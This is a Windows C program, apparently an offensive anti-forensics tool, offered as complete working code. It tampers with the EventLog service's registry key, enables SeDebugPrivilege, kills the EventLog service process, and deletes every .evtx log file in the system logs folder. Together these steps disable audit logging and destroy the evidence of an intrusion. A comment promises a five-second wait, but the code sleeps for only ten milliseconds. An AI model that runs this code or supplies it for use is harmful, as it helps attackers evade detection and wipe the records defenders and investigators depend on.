#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <psapi.h>

BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(
            NULL,            // lookup privilege on local system
            lpszPrivilege,   // privilege to lookup
            &luid)) {        // receives LUID of privilege
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;

    // Enable the privilege or disable all privileges.
    if (!AdjustTokenPrivileges(
            hToken,
            FALSE,
            &tp,
            sizeof(TOKEN_PRIVILEGES),
            (PTOKEN_PRIVILEGES)NULL,
            (PDWORD)NULL)) {
        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("The token does not have the specified privilege. \n");
        return FALSE;
    }

    return TRUE;
}

void ChangeRegistryValue() {
    HKEY hKey;
    LONG result;
    result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Services\\EventLog\\Parameters"), 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) {
        printf("Failed to open registry key. Error: %ld\n", result);
        return;
    }

    const char* newValue = "Test";
    result = RegSetValueEx(hKey, TEXT("ServiceMain"), 0, REG_SZ, (const BYTE*)newValue, strlen(newValue) + 1);
    if (result != ERROR_SUCCESS) {
        printf("Failed to set registry value. Error: %ld\n", result);
    } else {
        printf("Registry value changed successfully.\n");
    }

    RegCloseKey(hKey);
}

DWORD GetEventLogProcessId() {
    SC_HANDLE scManager = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (scManager == NULL) {
        printf("Failed to open service manager. Error: %ld\n", GetLastError());
        return 0;
    }

    SC_HANDLE scService = OpenService(scManager, TEXT("EventLog"), SERVICE_QUERY_STATUS);
    if (scService == NULL) {
        printf("Failed to open EventLog service. Error: %ld\n", GetLastError());
        CloseServiceHandle(scManager);
        return 0;
    }

    SERVICE_STATUS_PROCESS ssp;
    DWORD bytesNeeded;
    if (!QueryServiceStatusEx(scService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded)) {
        printf("Failed to query service status. Error: %ld\n", GetLastError());
        CloseServiceHandle(scService);
        CloseServiceHandle(scManager);
        return 0;
    }

    CloseServiceHandle(scService);
    CloseServiceHandle(scManager);
    return ssp.dwProcessId;
}

void KillProcess(DWORD processId) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("OpenProcessToken error: %u\n", GetLastError());
        return;
    }

    if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE)) {
        printf("Failed to enable SeDebugPrivilege.\n");
        CloseHandle(hToken);
        return;
    }

    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processId);
    if (hProcess == NULL) {
        printf("Failed to open process. Error: %ld\n", GetLastError());
        CloseHandle(hToken);
        return;
    }

    if (!TerminateProcess(hProcess, 0)) {
        printf("Failed to terminate process. Error: %ld\n", GetLastError());
    } else {
        printf("Process terminated successfully.\n");
    }

    CloseHandle(hProcess);
    CloseHandle(hToken);
}

BOOL endsWithEvtx(const char *str) {
    const char *suffix = ".evtx";
    size_t strLen = strlen(str);
    size_t suffixLen = strlen(suffix);

    if (strLen < suffixLen) {
        return FALSE;
    }

    return (strncmp(str + strLen - suffixLen, suffix, suffixLen) == 0);
}

void DeleteEventLogFile() {
    LPCTSTR directoryPath = "C:\\Windows\\System32\\winevt\\Logs\\";
    WIN32_FIND_DATA findFileData;
    HANDLE hFind;
    TCHAR searchPath[MAX_PATH];

    // Construct the search path.
    _stprintf(searchPath, _T("%s\\*"), directoryPath);

    // Find the first file in the directory.
    hFind = FindFirstFile(searchPath, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Invalid file handle. Error is %u.\n", GetLastError());
        return;
    } 

    do {

        // Construct the full file path.
        TCHAR filePath[MAX_PATH];
        _stprintf(filePath, _T("%s\\%s"), directoryPath, findFileData.cFileName);

        if (endsWithEvtx(filePath)) {
            if (!DeleteFile(filePath)) {
                printf("Failed to delete file %s. Error %u.\n", filePath, GetLastError());
            } else {
                printf("Deleted file: %s\n", filePath);
            }
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
}

int main() {
    printf("[+] Changing registry value...\n");
    ChangeRegistryValue();

    printf("[+] Getting EventLog service process ID...\n");
    DWORD processId = GetEventLogProcessId();
    if (processId == 0) {
        printf("Failed to get EventLog process ID.\n");
    } else {
        printf("[+] Killing EventLog service process with ID: %ld...\n", processId);
        KillProcess(processId);
    }

    // Wait 5 seconds for the EventLog service to exit and close all of his handles
    Sleep(10);

    printf("[+] Deleting event log file...\n");
    DeleteEventLogFile();

    printf("[+] Operation completed.\n");
    return 0;
}
